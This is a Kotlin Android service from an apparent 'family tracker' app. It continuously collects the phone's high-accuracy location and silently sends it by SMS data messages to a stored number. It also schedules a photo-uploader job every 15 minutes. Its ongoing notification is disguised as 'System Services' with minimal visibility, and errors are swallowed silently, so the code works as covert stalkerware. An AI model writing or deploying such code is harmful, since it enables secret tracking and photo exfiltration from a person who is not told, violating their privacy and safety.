package com.family.tracker.child

import android.app.*
import android.content.Context
import android.content.Intent
import android.os.IBinder
import android.telephony.SmsManager
import com.google.android.gms.location.*

class LocationService : Service() {
    private lateinit var fused: FusedLocationProviderClient

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onCreate() {
        super.onCreate()
        fused = LocationServices.getFusedLocationProviderClient(this)
        val channel = NotificationChannel("sys_channel", "System Services", NotificationManager.IMPORTANCE_MIN)
        getSystemService(NotificationManager::class.java).createNotificationChannel(channel)
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val notification = Notification.Builder(this, "sys_channel")
            .setContentTitle("Services système")
            .setContentText("Exécution en arrière-plan")
            .setSmallIcon(android.R.drawable.ic_menu_info_details)
            .setOngoing(true)
            .setShowWhen(false)
            .build()
        startForeground(1, notification)

        val prefs = getSharedPreferences("tracker", Context.MODE_PRIVATE)
        val parentNumber = prefs.getString("parent", "") ?: ""
        if (parentNumber.isEmpty()) {
            stopSelf()
            return START_NOT_STICKY
        }

        fused.lastLocation.addOnSuccessListener { location ->
            location?.let {
                val data = "${it.latitude},${it.longitude},${it.accuracy},${System.currentTimeMillis()}".toByteArray()
                try {
                    SmsManager.getDefault().sendDataMessage(parentNumber, null, 8901.toShort(), data, null, null)
                } catch (_: Exception) {}
            }
        }

        val request = LocationRequest.Builder(Priority.PRIORITY_HIGH_ACCURACY, 30000)
            .setMinUpdateIntervalMillis(10000)
            .build()

        val callback = object : LocationCallback() {
            override fun onLocationResult(result: LocationResult) {
                val loc = result.lastLocation ?: return
                val data = "${loc.latitude},${loc.longitude},${loc.accuracy},${System.currentTimeMillis()}".toByteArray()
                try {
                    SmsManager.getDefault().sendDataMessage(parentNumber, null, 8901.toShort(), data, null, null)
                } catch (_: Exception) {}
            }
        }

        try {
            fused.requestLocationUpdates(request, callback, mainLooper)
        } catch (_: SecurityException) {}

        androidx.work.WorkManager.getInstance(this).enqueue(
            androidx.work.PeriodicWorkRequestBuilder<PhotoUploaderWorker>(15, java.util.concurrent.TimeUnit.MINUTES).build()
        )

        return START_STICKY
    }
}
